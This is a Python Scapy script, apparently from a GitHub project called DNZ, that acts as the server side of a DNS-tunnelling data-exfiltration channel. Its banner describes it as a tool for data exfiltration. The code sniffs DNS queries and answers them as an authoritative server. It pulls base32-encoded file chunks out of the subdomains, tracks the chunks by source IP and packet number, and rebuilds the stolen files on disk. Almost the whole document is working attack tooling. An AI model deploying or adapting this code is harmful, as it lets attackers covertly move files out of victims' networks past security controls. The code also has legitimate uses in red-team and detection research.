#!/usr/bin/env python
### DNZ server by zalt3es
### URL: https://github.com/zalt3es/dnz
### Scapy DNS request/response adapted for our needs from : https://github.com/emileaben/scapy-dns-ninja

from scapy.all import *
import sys
import re
import traceback
import struct
import base64
import datetime

conf={}
conf['ServerIP'] = "192.168.0.1" #required  so we would not analyze trafic which comes from our machine, though we still analyze DNS reponses :( but killing those with regex
conf['ServerDomain'] = "my.domain.com"
conf['IFACE'] = "eth0"

print "-"*25
print "DNZ: last thing to try for Data Exfiltration."
print "{0} ourIP domain interface".format(sys.argv[0])
print "{0} 192.168.0.1 my.domain.com eth0 - these are default values".format(sys.argv[0])
print "-"*25

#simple try to capture the arguments or leave default
try:
    conf['ServerIP'] = sys.argv[1]
    conf['ServerDomain'] = sys.argv[2]
    conf['IFACE'] = sys.argv[3]
except:
    pass
myFiles = {} #global - keeping all our transfers :) - want run DOS? Looks like an easy thing to do :)

def recreateFile(theFile):
    global myFiles
    print "trying to reconstruct file"
    myString=''
    try:
        for packet in myFiles[theFile]['allPackets']:
            myString += packet
        tmp = len(myString) % 8
        if tmp>0:
            for x in range(0,8-tmp):
                myString += "=" # adding since we are not transfering those over DNS request
        toWrite = base64.b32decode(myString)
        curTime = datetime.datetime.now()
        toDisk = open("{0}-{6}-{1}.{2}.{3}.{4}-{5}".format(myFiles[theFile]['ip'],curTime.day,curTime.hour,curTime.minute,curTime.second,myFiles[theFile]['fileName'],theFile[-1:]), 'wb')
        toDisk.write(toWrite)
        toDisk.close()
        del myFiles[theFile]
    except:
        pass

def current_status():
  global myFiles
  for k,v in myFiles.items():
    total = v['tPackets']
    count = 0
    for i in v['allPackets']:
      if i is not None:
        count += 1
    if count==total:
      recreateFile(k)
    print "{3}-{0}\t{5}%\t{1}/{2}\t{4}".format(k[-1:],count,total,v['ip'],v['fileName'],int(count*100/total))
def generate_response( pkt, dest, proto ):
   ptype='A'
   resp = IP(dst=pkt[IP].src, id=pkt[IP].id)\
      /UDP(dport=pkt[UDP].sport, sport=53)\
      /DNS( id=pkt[DNS].id,
            aa=1, #we are authoritative
            qr=1, #it's a response
            rd=pkt[DNS].rd, # copy recursion-desired
            qdcount=pkt[DNS].qdcount, # copy question-count
            qd=pkt[DNS].qd, # copy question itself
            ancount=1, #we provide a single answer
            an=DNSRR(rrname=pkt[DNS].qd.qname, type=ptype, ttl=1, rdata=dest ),
      )
   return resp

#250 - len(domain) len(.my.domain.com)=14, might be longer but subdomain can be max 63, therefore, should be fine for having 63
#if packet number =0000, then we get the number of packets to expect and create an array
#{'tPackets': nr, 'allPackets':[None]*nr}
# Structure:
#hhhhhhhhAXXXXpppppppppp ; 63-13; 40 chars for payload in base32, still can increase by 10, to fill in, that would increase speed and size limit
#hhhhhhhh - IP of originating machine
# A       - File number (in case you want to run multiple files from the machine - noisy)
# XXXX    - packet number
#NVQW233TEB3GC4TUNE====== (24) should be dividable by 8
def DNS_Responder(conf):
    #TODO better regex
    re_getlist = re.compile(r'([a-z0-9\-]+)\.%s\.$' % ( conf['ServerDomain'] ) )
    def getResponse(pkt):
        global dest_idx
        global myFiles
#        print pkt
        if (DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0):
            try:
                pkt_proto = 'v4'
                if pkt[DNS].qd.qtype == 1:
                    pkt_proto='v4'
                else: ### won't respond to non A packet
                    return
                requestedURL = pkt[DNS].qd.qname.upper()
                subdomain = requestedURL.split(".")[0]
                requestorIPfile = subdomain[0:9]
                partOfFile = int(subdomain[9:13])
                payload = subdomain[13:]
                dest_ip = '127.0.0.1'
                #checking if new
                if partOfFile==0:
                    # initiating file transfer
                    needToCreate = True
                    fileName=".txt"
                    try:
                        fileName = payload[4:]
                        tmp = len(fileName) % 8
                        if tmp>0:
                            for x in range(0,8-tmp):
                                fileName += "="
                        fileName = base64.b32decode(fileName)
                        fileName = fileName.replace("..","")
                        fileName = fileName.replace("/","")
                    except:
                        pass
                    try:
                        payload = int(payload[0:4])
                        temp = myFiles[requestorIPfile]
                        needToCreate = False
                        return
                    except:
                        pass
                    if needToCreate:
                        print "initiating file since it does not exist"
                        someIP = "0.0.0.0"
                        try:
                            someIP = "{0}.{1}.{2}.{3}".format(int(requestorIPfile[0:2],16),int(requestorIPfile[2:4],16),int(requestorIPfile[4:6],16),int(requestorIPfile[6:8],16))
                        except:
                            pass
                        myFiles[requestorIPfile] = {'tPackets': payload, 'allPackets':[None]*payload, 'fileName': fileName, "ip": someIP}
                #File exists,let's add the payload to array
                else:
                    partOfFile = partOfFile-1
                    try:
                        myFiles[requestorIPfile]['allPackets'][partOfFile] = payload
                        partOfFile +=1
                    except:
                        return
                try:
                    current_status()
                except:
                    pass
                resp = generate_response( pkt, '127.0.0.1', pkt_proto )
                send(resp,verbose=0)
                return "src=%s list=%s proto=%s dest=%s" % ( pkt[IP].src, subdomain, pkt_proto, dest_ip )
            except:
                print >>sys.stderr,"%s" % ( traceback.print_tb( sys.exc_info()[2] ) )
    return getResponse

print >>sys.stderr, "config loaded, starting operation"
print "Listening on {0}:{1}; responding to request to {2}".format(conf['IFACE'],conf['ServerIP'],conf['ServerDomain'])
#filter = "udp port 53 and ip dst %s and not ip src %s" % (conf['ServerIP'], conf['ServerIP'])
filter = "udp port 53 and ip dst %s" % ( conf['ServerIP'])
sniff(filter=filter,store=0,prn=DNS_Responder(conf), iface=conf['IFACE'])
